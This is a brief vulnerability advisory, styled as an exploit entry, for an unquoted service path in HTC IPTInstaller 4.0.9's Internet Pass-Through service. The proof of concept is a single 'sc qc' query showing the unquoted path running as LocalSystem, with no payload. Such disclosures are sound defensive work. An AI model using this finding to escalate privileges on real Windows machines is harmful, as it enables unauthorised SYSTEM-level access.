@@ -1,0 +1,27 @@
+#Exploit Title: IPTInstaller 4.0.9 - 'PassThru Service' Unquoted Service Path
+#Exploit Author : SamAlucard
+#Exploit Date: 2020-11-08
+#Vendor : HTC
+#Version : IPTInstaller 4.0.9
+#Vendor Homepage :  https://www.htc.com/latam/
+#Tested on OS: Windows 7 Pro
+
+#Analyze PoC :
+==============
+
+C:\Users\DSAZ230>sc qc "PassThru Service"
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: PassThru Service
+        TIPO               : 10
+[image: PassThruserv.jpg]
+ WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\HTC\Internet
+Pass-Through\PassThruSvr.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Internet Pass-Through Service
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
